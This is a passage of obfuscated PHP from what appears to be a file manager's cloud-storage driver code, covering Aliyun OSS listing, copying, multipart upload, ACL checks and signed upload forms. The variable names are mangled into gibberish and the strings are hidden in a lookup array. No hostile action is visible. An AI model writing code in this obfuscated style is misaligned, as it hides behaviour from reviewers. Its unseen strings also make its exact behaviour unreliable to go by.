$´ÈôåÑ[1393]); if (!$Âœâ¶) { return !1; } fseek_64($Âœâ¶, $ô…­ÉåÛ); $Û­Íå«» = fread($Âœâ¶, $‹©‡³—‘); fclose($Âœâ¶); return $Û­Íå«»; } public function upload($ŸüË©òš, $Â©İ£ûÁ, $¶¯Î¥ì = false, $»„´“ò³ = REPEAT_REPLACE) { if ($¶¯Î¥ì) { return $this->moveFile($Â©İ£ûÁ, $ŸüË©òš); } return $this->copyFile($Â©İ£ûÁ, $ŸüË©òš); } public function setModifyTime($ıšĞÕà¾, $ˆ½ ÷ú— = '') { @touch($ıšĞÕà¾, intval($ˆ½ ÷ú—)); } public function download($ÅÀ†Æµ¢, $¥”àÍç®) { return $this->iconvSystem($ÅÀ†Æµ¢); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÈÑ¬×Öı) { parent::__construct($ÈÑ¬×Öı); $this->signatureVersion($_SERVER[Ü©»’·][216]); } public function fileOutLink($¾ÄÊ¿İê) { $”Ô¾¹Ñ =& $_SERVER[Ü©»’·]; if (substr($¾ÄÊ¿İê, 0, 7) == $”Ô¾¹Ñ[1337]) { $¾ÄÊ¿İê = $”Ô¾¹Ñ[1338] . substr($¾ÄÊ¿İê, 7); } header($”Ô¾¹Ñ[161] . $¾ÄÊ¿İê); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($§æÈ­«å) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ü©»’·][1394]; $this->_init($§æÈ­«å); } public function _init($¡è…êÒ—) { $ãæÑÁñŒ =& $_SERVER[Ü©»’·]; foreach ($¡è…êÒ— as $¾¶Üë…˜ => $ÈŒ„©·î) { if (isset($this->{$¾¶Üë…˜})) { $this->{$¾¶Üë…˜} = $ÈŒ„©·î; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ãæÑÁñŒ[1395] . LNG($ãæÑÁñŒ[1396])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¬·åäß =& $_SERVER[Ü©»’·]; $Êş«ªä¦ = new OSS\Model\CorsConfig(); $ãôı¦ = new OSS\Model\CorsRule(); $ãôı¦->addAllowedOrigin($¬·åäß[1397]); $ãôı¦->addAllowedMethod($¬·åäß[1398]); $ãôı¦->addAllowedMethod($¬·åäß[1399]); $ãôı¦->addAllowedMethod($¬·åäß[1400]); $ãôı¦->addAllowedMethod($¬·åäß[1401]); $ãôı¦->addAllowedMethod($¬·åäß[160]); $ãôı¦->setMaxAgeSeconds(600); $ãôı¦->addExposeHeader($¬·åäß[1402]); $ãôı¦->addAllowedHeader($¬·åäß[1397]); $Êş«ªä¦->addRule($ãôı¦); try { $this->client->putBucketCors($this->bucket, $Êş«ªä¦); } catch (OSS\Core\OssException $ïÒÏÆÏŸ) { return !1; } return !0; } public function getBucketCors() { $à€ĞÎÜš =& $_SERVER[Ü©»’·]; $—¯šÌì– = null; try { $—¯šÌì– = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $æÑ˜²Ü£) { return null; } if (!$—¯šÌì– || !($‘ÖõÊÉ¤ = $—¯šÌì–->getRules())) { return null; } $ËŠòà£ = $‘ÖõÊÉ¤[0]->getAllowedOrigins(); $âë»¡¬¯ = $‘ÖõÊÉ¤[0]->getAllowedMethods(); $‰àƒÁ”¨ = $‘ÖõÊÉ¤[0]->getMaxAgeSeconds(); $œ¸²ò–’ = $‘ÖõÊÉ¤[0]->getExposeHeaders(); $ÏÀ–ú¦À = $‘ÖõÊÉ¤[0]->getAllowedHeaders(); return array($à€ĞÎÜš[187] => isset($ËŠòà£[0]) ? $ËŠòà£[0] : $à€ĞÎÜš[12], $à€ĞÎÜš[191] => $âë»¡¬¯, $à€ĞÎÜš[1403] => $‰àƒÁ”¨, $à€ĞÎÜš[1404] => isset($œ¸²ò–’[0]) ? $œ¸²ò–’[0] : $à€ĞÎÜš[12], $à€ĞÎÜš[189] => isset($ÏÀ–ú¦À[0]) ? $ÏÀ–ú¦À[0] : $à€ĞÎÜš[12]); } public function isBucketCors() { $ã‹Ë‹í· =& $_SERVER[Ü©»’·]; $“™ğ·úŞ = $this->getBucketCors(); if (!$“™ğ·úŞ || !is_array($“™ğ·úŞ)) { return !1; } if ($“™ğ·úŞ[$ã‹Ë‹í·[187]] != $ã‹Ë‹í·[188] || $“™ğ·úŞ[$ã‹Ë‹í·[189]] != $ã‹Ë‹í·[188]) { return !1; } $³¡ÆÄ²“ = array_map($ã‹Ë‹í·[190], $“™ğ·úŞ[$ã‹Ë‹í·[191]]); if (!is_array($³¡ÆÄ²“)) { $³¡ÆÄ²“ = array(); } $ÂÙÄß‰ = array($ã‹Ë‹í·[192], $ã‹Ë‹í·[193], $ã‹Ë‹í·[194], $ã‹Ë‹í·[195], $ã‹Ë‹í·[196]); $¼€ËÏùÛ = array_diff($ÂÙÄß‰, $³¡ÆÄ²“); return empty($¼€ËÏùÛ); } public function mkfile($‡ÌÉù²Ò, $Ñ»ÔÇ±› = '', $ëÈóØ÷² = REPEAT_RENAME) { $ˆàŸ¢„Ê = $this->setContent($‡ÌÉù²Ò, $Ñ»ÔÇ±›); if ($ˆàŸ¢„Ê !== !1) { return $this->getPathOuter($‡ÌÉù²Ò); } return !1; } public function mkdir($¯”Ã†í, $ßÓšç¨ = REPEAT_SKIP) { if ($ßÓšç¨ && $this->_isFolder($¯”Ã†í)) { return $this->getPathOuter($¯”Ã†í); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¯”Ã†í)); } catch (OSS\Core\OssException $í½¶“Ó) { return !1; } return $this->getPathOuter($¯”Ã†í); } private function fileList($Ø”î‹Ğ¨, $ŠÎ•Ì‚å = '', $â§Œ¡—Š = 0) { $¦²‰§’¢ =& $_SERVER[Ü©»’·]; $Ø”î‹Ğ¨ = trim($Ø”î‹Ğ¨, $¦²‰§’¢[8]); $¼º‘¤½¯ = empty($Ø”î‹Ğ¨) && $Ø”î‹Ğ¨ !== $¦²‰§’¢[197] ? $¦²‰§’¢[12] : $Ø”î‹Ğ¨ . $¦²‰§’¢[8]; $¶“¼Ú³Å = $¦²‰§’¢[12]; $òÆÄ‹˜ = 1000; $˜Í÷î¹ = $·Ä›àÂ = array(); while (!0) { check_abort(); $ê ¶¹ßÕ = array($¦²‰§’¢[1405] => $ŠÎ•Ì‚å, $¦²‰§’¢[1406] => $¼º‘¤½¯, $¦²‰§’¢[1407] => $òÆÄ‹˜, $¦²‰§’¢[1408] => $¶“¼Ú³Å); try { $ü­Å—òì = $this->client->listObjects($this->bucket, $ê ¶¹ßÕ); } catch (OSS\Core\OssException $¶ÄÃíÉô) { break; } $¶“¼Ú³Å = $ü­Å—òì->getNextMarker(); $ò¡ÂÂ“ = $ü­Å—òì->getObjectList(); $¹šæ³éÓ = $ü­Å—òì->getPrefixList(); foreach ($ò¡ÂÂ“ as $•ø¥Ò·) { if ($•ø¥Ò·->getKey() == $¼º‘¤½¯) { continue; } $Úç•«İµ = $•ø¥Ò·->getKey(); $üç˜úÀÌ = $•ø¥Ò·->getSize(); $ºâñöğà = $•ø¥Ò·->getLastModified(); $ûà‘¿Ğ° = $â§Œ¡—Š ? array($¦²‰§’¢[32] => $Úç•«İµ, $¦²‰§’¢[76] => $üç˜úÀÌ, $¦²‰§’¢[203] => strtotime($ºâñöğà)) : $Úç•«İµ; $î°ºˆÉ = $üç˜úÀÌ == 0 && substr($Úç•«İµ, strlen($Úç•«İµ) - 1, 1) == $¦²‰§’¢[8] ? !0 : !1; $ËÈ”€ì¬ = array($¦²‰§’¢[76] => $üç˜úÀÌ, $¦²‰§’¢[1409] => $üç˜úÀÌ, $¦²‰§’¢[85] => strtotime($ºâñöğà), $¦²‰§’¢[1410] => $ºâñöğà); $this->cacheMethodInfoSet($Úç•«İµ, $î°ºˆÉ, $ËÈ”€ì¬); if ($î°ºˆÉ) { $˜Í÷î¹[] = $Úç•«İµ; continue; } $·Ä›àÂ[] = $ûà‘¿Ğ°; } foreach ($¹šæ³éÓ as $ï‰‚ô£ğ) { $˜Í÷î¹[] = $ï‰‚ô£ğ->getPrefix(); $this->cacheMethodInfoSet($ï‰‚ô£ğ->getPrefix(), !0); } if ($¶“¼Ú³Å === $¦²‰§’¢[12]) { break; } } $this->cacheMethodInfoSet($Ø”î‹Ğ¨, !0); return array($¦²‰§’¢[82] => $˜Í÷î¹, $¦²‰§’¢[83] => $·Ä›àÂ); } public function copyFile($ş°ÍŠˆî, $€Ä¨ğöä) { $â„¦ª³ = $this->size($ş°ÍŠˆî); if ($â„¦ª³ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ş°ÍŠˆî, $this->bucket, $this->pathEncode($€Ä¨ğöä)); } catch (OSS\Core\OssException $ö°µçöª) { return !1; } return $this->getPathOuter($€Ä¨ğöä); } $„ó¾ñˆ = $this->multiCopyObject($ş°ÍŠˆî, $€Ä¨ğöä, $â„¦ª³); return $„ó¾ñˆ ? $this->getPathOuter($€Ä¨ğöä) : !1; } private function multiCopyObject($¨âàê¹, $û¿Âï—”, $¡à¬÷ê•) { $óŠÜ“¿› =& $_SERVER[Ü©»’·]; try { $ª‰’ê¡¢ = array(); if ($ÇŠØ¹¢Ó = $this->hashMd5($¨âàê¹)) { $ª‰’ê¡¢ = array(OSS\OssClient::OSS_HEADERS => array($óŠÜ“¿›[1411] => $ÇŠØ¹¢Ó)); } $ú²¯Ö™Ë = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($û¿Âï—”), $ª‰’ê¡¢); $Ú×šúÔá = 1; $”ÏÑÛ÷Ì = 0; $‹âà˜” = array(); $‹È´¿¸ = 1024 * 1024 * 10; $æº½’”û = $this->client->generateMultiuploadParts($¡à¬÷ê•, $‹È´¿¸); foreach ($æº½’”û as $âĞ¢¢ã¦ => $Æİ˜ˆî) { $”É…È÷Æ = $”ÏÑÛ÷Ì + (int) $Æİ˜ˆî[$óŠÜ“¿›[1412]]; $”±›ú½² = (int) $Æİ˜ˆî[$óŠÜ“¿›[337]] + $”É…È÷Æ - 1; $áö‚‰¥ = array($óŠÜ“¿›[1413] => $”É…È÷Æ, $óŠÜ“¿›[1414] => $”±›ú½²); $‹âà˜”[] = $this->client->uploadPartCopy($this->bucket, $¨âàê¹, $this->bucket, $this->pathEncode($û¿Âï—”), $Ú×šúÔá, $ú²¯Ö™Ë, $áö‚‰¥); $Ú×šúÔá = $Ú×šúÔá + 1; } $™Ã÷±’ = array(); foreach ($‹âà˜” as $âĞ¢¢ã¦ => $††âæ) { $™Ã÷±’[] = array($óŠÜ“¿›[1415] => $âĞ¢¢ã¦ + 1, $óŠÜ“¿›[1416] => $††âæ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($û¿Âï—”), $ú²¯Ö™Ë, $™Ã÷±’); } catch (OSS\Core\OssException $ëóÖûæç) { return !1; } return !0; } public function moveFile($¸‘†Ò¹÷, $—¥À–´Õ) { if ($this->copyFile($¸‘†Ò¹÷, $—¥À–´Õ)) { $this->remove($¸‘†Ò¹÷); return $this->getPathOuter($—¥À–´Õ); } return !1; } public function delFile($·Ûöëû ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($·Ûöëû )); } catch (OSS\Core\OssException $ØÁÕÒÜË) { return !1; } return !0; } public function delFolder($Òø¿´Ñ·) { $ÓŒ§·ˆ´ =& $_SERVER[Ü©»’·]; if (!$this->exist($Òø¿´Ñ·)) { return !0; } $this->listItemCache = !1; $“¸“ ï´ = $this->fileList($Òø¿´Ñ·); $this->listItemCache = !0; $¼ßìŒÌ— = trim($Òø¿´Ñ·, $ÓŒ§·ˆ´[8]) . $ÓŒ§·ˆ´[8]; if (!empty($Òø¿´Ñ·) && $Òø¿´Ñ· !== $ÓŒ§·ˆ´[197] && !in_array($¼ßìŒÌ—, $“¸“ ï´[$ÓŒ§·ˆ´[82]])) { $“¸“ ï´[$ÓŒ§·ˆ´[82]][] = $¼ßìŒÌ—; } $úÊò€Áç = $this->delByBatch($“¸“ ï´[$ÓŒ§·ˆ´[83]]); if (!$úÊò€Áç) { return !1; } $úÊò€Áç = $this->delByBatch($“¸“ ï´[$ÓŒ§·ˆ´[82]]); if (!$úÊò€Áç) { return !1; } return $this->delFile($¼ßìŒÌ—); } private function delByBatch($¯©¸ÒŒ) { foreach (array_chunk($¯©¸ÒŒ, 1000) as $Éš›Ïö) { try { $this->client->deleteObjects($this->bucket, $Éš›Ïö); } catch (OSS\Core\OssException $¡Êç¶“Ÿ) { return !1; } } return !0; } public function rename($—ÙØÍ²™, $‰¤€Š) { return $this->renameObject($—ÙØÍ²™, $‰¤€Š); } private function fileInfo($ùÂ·ÎıÄ, $÷òŸÓĞ§ = false, $•èÃ€– = array()) { $€Ô³“ÏĞ =& $_SERVER[Ü©»’·]; $ÏĞ‰ÚÆí = array($€Ô³“ÏĞ[32] => $this->pathThis($ùÂ·ÎıÄ), $€Ô³“ÏĞ[84] => $this->getPathOuter($ùÂ·ÎıÄ), $€Ô³“ÏĞ[33] => $€Ô³“ÏĞ[199], $€Ô³“ÏĞ[76] => isset($•èÃ€–[$€Ô³“ÏĞ[76]]) ? $•èÃ€–[$€Ô³“ÏĞ[76]] : 0, $€Ô³“ÏĞ[174] => $this->ext($ùÂ·ÎıÄ)); if ($÷òŸÓĞ§) { return $ÏĞ‰ÚÆí; } $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[200]] = $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[85]] = 0; $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[201]] = $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[202]] = !0; if (empty($•èÃ€–)) { $İìæ–›Ğ = $this->objectMeta($ùÂ·ÎıÄ); if (!$İìæ–›Ğ) { return $ÏĞ‰ÚÆí; } $•èÃ€– = array($€Ô³“ÏĞ[85] => strtotime($İìæ–›Ğ[$€Ô³“ÏĞ[1410]]), $€Ô³“ÏĞ[76] => $İìæ–›Ğ[$€Ô³“ÏĞ[1409]] + 0); } if (isset($•èÃ€–[$€Ô³“ÏĞ[76]])) { $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[76]] = $•èÃ€–[$€Ô³“ÏĞ[76]]; } if (isset($•èÃ€–[$€Ô³“ÏĞ[85]])) { $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[85]] = $•èÃ€–[$€Ô³“ÏĞ[85]]; } if (isset($•èÃ€–[$€Ô³“ÏĞ[203]]) && !trim($ÏĞ‰ÚÆí[$€Ô³“ÏĞ[85]])) { $ÏĞ‰ÚÆí[$€Ô³“ÏĞ[85]] = $•èÃ€–[$€Ô³“ÏĞ[203]]; } return $ÏĞ‰ÚÆí; } private function folderInfo($ò‡ûë÷, $“¦’²Ö = false, $ç¥ÚØÚñ = array()) { $ç«ñı·ä =& $_SERVER[Ü©»’·]; $’Ğë—×¢ = array($ç«ñı·ä[32] => $this->pathThis($ò‡ûë÷), $ç«ñı·ä[84] => $this->getPathOuter($ç«ñı·ä[8] . $ò‡ûë÷), $ç«ñı·ä[33] => $ç«ñı·ä[75]); if ($“¦’²Ö) { return $’Ğë—×¢; } $’Ğë—×¢[$ç«ñı·ä[200]] = $’Ğë—×¢[$ç«ñı·ä[85]] = 0; $’Ğë—×¢[$ç«ñı·ä[201]] = $’Ğë—×¢[$ç«ñı·ä[202]] = !0; if (empty($ç¥ÚØÚñ)) { $ò‡ûë÷ = rtrim($ò‡ûë÷, $ç«ñı·ä[8]) . $ç«ñı·ä[8]; $†€‹èÚó = $this->objectMeta($ò‡ûë÷); if (!$†€‹èÚó) { return $’Ğë—×¢; } $ç¥ÚØÚñ = array($ç«ñı·ä[200] => $†€‹èÚó[$ç«ñı·ä[520]][$ç«ñı·ä[1417]], $ç«ñı·ä[85] => strtotime($†€‹èÚó[$ç«ñı·ä[1410]])); } if (isset($ç¥ÚØÚñ[$ç«ñı·ä[85]])) { $’Ğë—×¢[$ç«ñı·ä[85]] = $ç¥ÚØÚñ[$ç«ñı·ä[85]]; } if (isset($ç¥ÚØÚñ[$ç«ñı·ä[200]])) { $’Ğë—×¢[$ç«ñı·ä[200]] = $ç¥ÚØÚñ[$ç«ñı·ä[200]]; } return $’Ğë—×¢; } public function listPath($º¶Ø€º‰, $¦ŸÄ²Šó = false) { $§¼åàÁ² =& $_SERVER[Ü©»’·]; $áÁˆ…ƒÁ = $this->fileList($º¶Ø€º‰, $§¼åàÁ²[8], !0); foreach ($áÁˆ…ƒÁ[$§¼åàÁ²[82]] as $Ìô¾¤âø => $‘óñ¾Á¢) { $áÁˆ…ƒÁ[$§¼åàÁ²[82]][$Ìô¾¤âø] = $this->folderInfo($‘óñ¾Á¢, $¦ŸÄ²Šó, $‘óñ¾Á¢); } foreach ($áÁˆ…ƒÁ[$§¼åàÁ²[83]] as $Ìô¾¤âø => $‘óñ¾Á¢) { $áÁˆ…ƒÁ[$§¼åàÁ²[83]][$Ìô¾¤âø] = $this->fileInfo($‘óñ¾Á¢[$§¼åàÁ²[32]], $¦ŸÄ²Šó, $‘óñ¾Á¢); } return $áÁˆ…ƒÁ; } protected function infoChildren($®½Ö¨½ü, &$úõä¾•) { $Â¢®Šïû =& $_SERVER[Ü©»’·]; $­ò‘û“ = $this->fileList($®½Ö¨½ü, $Â¢®Šïû[12], !0); $úõä¾•[$Â¢®Šïû[78]] += count($­ò‘û“[$Â¢®Šïû[82]]); $úõä¾•[$Â¢®Šïû[77]] += count($­ò‘û“[$Â¢®Šïû[83]]); foreach ($­ò‘û“[$Â¢®Šïû[83]] as $‹€üáÁ˜) { if (!$‹€üáÁ˜ || !$‹€üáÁ˜[$Â¢®Šïû[76]]) { continue; } $úõä¾•[$Â¢®Šïû[76]] += $‹€üáÁ˜[$Â¢®Šïû[76]]; } } public function has($ûåÇ•¢ş, $ù­éÂà = false, $½‰ªíáÖ = true) { $ÖÙœ®µ• =& $_SERVER[Ü©»’·]; $ûåÇ•¢ş = trim($ûåÇ•¢ş, $ÖÙœ®µ•[8]); $çà¢ê²„ = empty($ûåÇ•¢ş) && $ûåÇ•¢ş !== $ÖÙœ®µ•[197] ? $ÖÙœ®µ•[12] : $ûåÇ•¢ş . $ÖÙœ®µ•[8]; $öÒ¼ò›Ï = $ÖÙœ®µ•[12]; $öÇÆ®ƒâ = 500; $¢¨×ççş = $µÑÆ½‹€ = 0; while (!0) { check_abort(); $ú•¢æç¯ = array($ÖÙœ®µ•[1405] => $ÖÙœ®µ•[8], $ÖÙœ®µ•[1406] => $çà¢ê²„, $ÖÙœ®µ•[1407] => $öÇÆ®ƒâ, $ÖÙœ®µ•[1408] => $öÒ¼ò›Ï); try { $Ô¯œàæ® = $this->client->listObjects($this->bucket, $ú•¢æç¯); } catch (OSS\Core\OssException $ğÍ¬Úµˆ) { break; } $öÒ¼ò›Ï = $Ô¯œàæ®->getNextMarker(); $á¾ûóû = $Ô¯œàæ®->getObjectList(); $„úˆÏî· = $Ô¯œàæ®->getPrefixList(); if ($ù­éÂà) { if (count($á¾ûóû) > 1 || count($á¾ûóû) == 1 && $á¾ûóû[0]->getKey() != $çà¢ê²„) { $¢¨×ççş += count($á¾ûóû) - 1; } if (!empty($„úˆÏî·)) { $µÑÆ½‹€ += count($„úˆÏî·); } if ($öÒ¼ò›Ï === $ÖÙœ®µ•[12]) { break; } continue; } if ($½‰ªíáÖ) { if (!empty($á¾ûóû)) { if (count($á¾ûóû) > 1 || $á¾ûóû[0]->getKey() != $çà¢ê²„) { return !0; } } } else { if (!empty($„úˆÏî·)) { return !0; } } if ($öÒ¼ò›Ï === $ÖÙœ®µ•[12]) { break; } } if ($ù­éÂà) { return array($ÖÙœ®µ•[207] => $¢¨×ççş, $ÖÙœ®µ•[208] => $µÑÆ½‹€); } return !1; } public function listAll($‚™Æ›ß) { $‡Œ­„ÕÄ =& $_SERVER[Ü©»’·]; $ÔıÅƒ¨ˆ = $this->fileList($‚™Æ›ß, $‡Œ­„ÕÄ[12], !0); $’²Î»şí = array(); foreach ($ÔıÅƒ¨ˆ[$‡Œ­„ÕÄ[83]] as $§½ÒÎ±Ï) { $’²Î»şí[$§½ÒÎ±Ï[$‡Œ­„ÕÄ[32]]] = $§½ÒÎ±Ï[$‡Œ­„ÕÄ[76]]; } foreach ($ÔıÅƒ¨ˆ[$‡Œ­„ÕÄ[82]] as $§½ÒÎ±Ï) { if (is_string($§½ÒÎ±Ï)) { $’²Î»şí[$§½ÒÎ±Ï] = 0; } } return $this->listAllFiles($‚™Æ›ß, array_keys($’²Î»şí), $’²Î»şí); } public function canRead($·çü¯) { $ĞéŞ–ÅÄ =& $_SERVER[Ü©»’·]; $°±ó˜óÄ = $this->pathAcl($·çü¯); return $°±ó˜óÄ == $ĞéŞ–ÅÄ[1418] || $°±ó˜óÄ == $ĞéŞ–ÅÄ[565] ? !0 : !1; } public function canWrite($âÒ´”È¬) { $¸‹Å§ıé = $this->pathAcl($âÒ´”È¬); return $¸‹Å§ıé == $_SERVER[Ü©»’·][565] ? !0 : !1; } public function pathAcl($Ñü¼úñ) { $ÕÄÊ÷è¼ =& $_SERVER[Ü©»’·]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $©ø”ò = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ñü¼úñ)); } catch (OSS\Core\OssException $×û—Ä¯ş) { return !1; } $³å¸ß = $©ø”ò == $ÕÄÊ÷è¼[37] ? $this->bucketAcl : $©ø”ò; if ($³å¸ß == $ÕÄÊ÷è¼[1419]) { return $ÕÄÊ÷è¼[1418]; } if ($³å¸ß == $ÕÄÊ÷è¼[1420]) { return $ÕÄÊ÷è¼[565]; } return $³å¸ß; } private function chmodPath($ªˆÜáÇË, $Õ¡¢ßí = '') { $Ü€©Øƒı =& $_SERVER[Ü©»’·]; $‚úÆº‚º = empty($Õ¡¢ßí) ? $Ü€©Øƒı[1420] : $Õ¡¢ßí; $ïå¥ş±• = array($Ü€©Øƒı[37], $Ü€©Øƒı[198], $Ü€©Øƒı[1419], $Ü€©Øƒı[1420]); if (!in_array($‚úÆº‚º, $ïå¥ş±•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ªˆÜáÇË), $‚úÆº‚º); } catch (OSS\Core\OssException $òàúŠÉ‡) { return !1; } return !0; } public function getContent($ôñÙ¡) { return $this->fileSubstr($ôñÙ¡, -1); } public function setContent($Ğòîúë‚, $–Ô¬¶º = '') { $¾ÉÙ±Ôí =& $_SERVER[Ü©»’·]; try { $µê˜ÆËò = $this->trafficLimit($¾ÉÙ±Ôí[1421]); $ÂÖš”µÕ = $this->client->putObject($this->bucket, $this->pathEncode($Ğòîúë‚), $–Ô¬¶º, $µê˜ÆËò); } catch (OSS\Core\OssException $ÍÈ€’œƒ) { return !1; } $“®›¬ú = array($¾ÉÙ±Ôí[1411] => trim($ÂÖš”µÕ[$¾ÉÙ±Ôí[1422]], $¾ÉÙ±Ôí[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ğòîúë‚))); $this->updateObjMeta($Ğòîúë‚, $“®›¬ú); return isset($ÂÖš”µÕ[$¾ÉÙ±Ôí[1423]][$¾ÉÙ±Ôí[1370]]) ? !0 : !1; } private function updateObjMeta($ÏÔ€øÒ, $ÊüùéœÃ) { $ÏÔ€øÒ = $this->pathEncode($ÏÔ€øÒ); try { $Ë£•òÑß = array(OSS\OssClient::OSS_HEADERS => $ÊüùéœÃ); $this->client->copyObject($this->bucket, $ÏÔ€øÒ, $this->bucket, $ÏÔ€øÒ, $Ë£•òÑß); } catch (OSS\Core\OssException $Ÿü›¼õ) { return !1; } return !0; } public function upload($½ôŸÈ, $ê™üà‹‘, $ı³óÍÇî = false, $ğ±¡‘¶Ò = REPEAT_REPLACE) { $œ÷ğ‹¨Ã =& $_SERVER[Ü©»’·]; $õÊÜõ‘º = trim($½ôŸÈ, $œ÷ğ‹¨Ã[8]); $Â•¤…¤Ó = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($œ÷ğ‹¨Ã[1411] => @md5_file($ê™üà‹‘)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($½ôŸÈ))); $Â•¤…¤Ó = $this->trafficLimit($œ÷ğ‹¨Ã[1421], $Â•¤…¤Ó); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($õÊÜõ‘º), $ê™üà‹‘, $Â•¤…¤Ó); } catch (OSS\Core\OssException $şäã‹®Ş) { return !1; } return $this->getPathOuter($½ôŸÈ); } public function getHost() { $¿äßúÆ… =& $_SERVER[Ü©»’·]; $òØñ õ = explode($¿äßúÆ…[183], parent::getHost()); return $òØñ õ[0] . $¿äßúÆ…[183] . $this->bucket . $¿äßúÆ…[10] . $òØñ õ[1]; } public function uploadFormData($Ë”ŠÀŸé, $´ÅŞÆ… = 3600) { $ÜÀƒè‹À =& $_SERVER[Ü©»’·]; if (!($³úŸĞ˜Ø = $this->getHost())) { return !1; } $ø—¤”» = $´ÅŞÆ…; $¸¶«‚Øù = date($ÜÀƒè‹À[1424], time() + $ø—¤”»); $¼äü¦ôÕ = new DateTime($¸¶«‚Øù); $Œ³úçÒ³ = $¼äü¦ôÕ->format(DateTime::ISO8601); $Şå¨îÀÑ = strpos($Œ³úçÒ³, $ÜÀƒè‹À[296]); $Œ³úçÒ³ = substr($Œ³úçÒ³, 0, $Şå¨îÀÑ) . $ÜÀƒè‹À[1425]; $²±Ø½™ = 1048576000 * 5; $³áÎÇÁ§ = $this->pathFather($Ë”ŠÀŸé); $ñğ—¦ãÉ = array($ÜÀƒè‹À[1324] => $Œ³úçÒ³, $ÜÀƒè‹À[1325] => array(array($ÜÀƒè‹À[1426], 0, $²±Ø½™), array($ÜÀƒè‹À[1328], $ÜÀƒè‹À[1329], $³áÎÇÁ§))); $ŒŸ´œñ = base64_encode(json_encode($ñğ—¦ãÉ)); $«ÁŠ½¤‹ = base64_encode(hash_hmac($ÜÀƒè‹À[232], $ŒŸ´œñ, $this->secret, !0)); $çÀ¢»×” = array($ÜÀƒè‹À[1334] => $ŒŸ´œñ, $ÜÀƒè‹À[1427] => $this->accessKey, $ÜÀƒè‹À[1330] => $ÜÀƒè‹À[1322], $ÜÀƒè‹À[1428] => $«ÁŠ½¤‹, $ÜÀƒè‹À[181] => $³úŸĞ˜Ø); $çÀ¢»×” = $this->trafficLimit($ÜÀƒè‹À[1421], $çÀ¢»×”); return $çÀ¢»×”; } public function multiUploadFormData($„à¶©ÄÈ, $¸Æî­¼Ê = 3600) { $âĞÉ¸Ÿß =& $_SERVER[Ü©»’·]; if (!($€ƒÄ¦Ğà = $this->getHost())) { return !1; } $Õšš¢Å† = $this->trafficLimit($âĞÉ¸Ÿß[1421]); $áŸáÚ‰„ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($„à¶©ÄÈ), $Õšš¢Å†); return array($âĞÉ¸Ÿß[223] => $áŸáÚ‰„, $âĞÉ¸Ÿß[181] => $€ƒÄ¦Ğà . $âĞÉ¸Ÿß[8] . $this->pathEncode($„à¶©ÄÈ), $âĞÉ¸Ÿß[224] => gmdate($âĞÉ¸Ÿß[1429]), $âĞÉ¸Ÿß[94] => $„à¶©ÄÈ); } public function multiUploadAuthData($íÏ‡™—Ò, $¥Í¥¶Ò = array()) { $ü€²àÒá =& $_SERVER[Ü©»’·]; $¿’†ñ×æ = isset($¥Í¥¶Ò[$ü€²àÒá[224]]) ? $¥Í¥¶Ò[$ü€²àÒá[224]] : gmdate($ü€²àÒá[1429]); $«‰¥ªç” = isset($¥Í¥¶Ò[$ü€²àÒá[174]]) ? $¥Í¥¶Ò[$ü€²àÒá[174]] : $ü€²àÒá[12]; $ªê”óĞŸ = $íÏ‡™—Ò; if (isset($¥Í¥¶Ò[$ü€²àÒá[94]])) { $ªê”óĞŸ = $¥Í¥¶Ò[$ü€²àÒá[94]]; unset($¥Í¥¶Ò[$ü€²àÒá[94]]); } if (isset($¥Í¥¶Ò[$ü€²àÒá[225]])) { $¥Í¥¶Ò[$ü€²àÒá[224]] = $¿’†ñ×æ; return $this->listUploadParts($ªê”óĞŸ, $¥Í¥¶Ò); } $îº—û• = array($ü€²àÒá[226], $ü€²àÒá[12], $ü€²àÒá[120], $¿’†ñ×æ, "\x78\55\157\163\x73\55\x64\141\x74\x65\x3a{$¿’†ñ×æ}", $ü€²àÒá[8] . $this->bucket . $ü€²àÒá[8] . $ªê”óĞŸ . $«‰¥ªç”); if (strpos($«‰¥ªç”, $ü€²àÒá[227]) === 0) { $îº—û•[0] = $ü€²àÒá[228]; if ($‡º“ÜûÈ = $this->trafficLimit($ü€²àÒá[1421])) { $ªê”óĞŸ = $ü€²àÒá[1430]; array_splice($îº—û•, 5, 0, $ªê”óĞŸ . $ü€²àÒá[4] . $‡º“ÜûÈ[$ªê”óĞŸ]); } } if (isset($¥Í¥¶Ò[$ü€²àÒá[229]]) && $¥Í¥¶Ò[$ü€²àÒá[229]] == $ü€²àÒá[230]) { $îº—û•[0] = $ü€²àÒá[230]; } if (!empty($¥Í¥¶Ò[$ü€²àÒá[1431]])) { $¬¿Ş£÷ö = array_merge(array($îº—û•[4]), $¥Í¥¶Ò[$ü€²àÒá[1431]]); sort($¬¿Ş£÷ö); $îº—û•[4] = implode($ü€²àÒá[231], $¬¿Ş£÷ö); } $ÇÔ‘À¢ü = 